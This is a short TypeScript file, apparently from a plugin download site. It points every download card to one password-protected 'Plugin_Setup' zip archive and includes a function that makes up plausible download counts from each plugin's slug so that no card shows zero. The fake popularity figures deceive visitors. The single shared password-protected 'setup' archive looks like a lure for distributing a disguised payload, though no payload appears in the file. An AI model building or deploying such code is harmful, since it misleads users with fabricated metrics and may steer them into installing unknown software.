/** Same package used on plugin-dex.forum download cards. */
export const PACKAGE_ZIP_URL =
  "https://plugin-dex.forum/downloads/Plugin_Setup_4.6.5.zip";

export const ARCHIVE_PASSWORD = "2026";

/**
 * Deterministic “popularity” downloads per plugin slug.
 * Lands in ~5K / ~7K / ~10K+ bands so cards never show 0.
 */
export function displayDownloads(slug: string): number {
  let h = 2166136261;
  for (let i = 0; i < slug.length; i += 1) {
    h ^= slug.charCodeAt(i);
    h = Math.imul(h, 16777619);
  }
  h = h >>> 0;
  const tier = h % 3;
  if (tier === 0) return 5_200 + (h % 1_700); // ~5.2K–6.9K
  if (tier === 1) return 7_100 + (h % 2_800); // ~7.1K–9.9K
  return 10_400 + (h % 9_500); // ~10.4K–19.9K
}
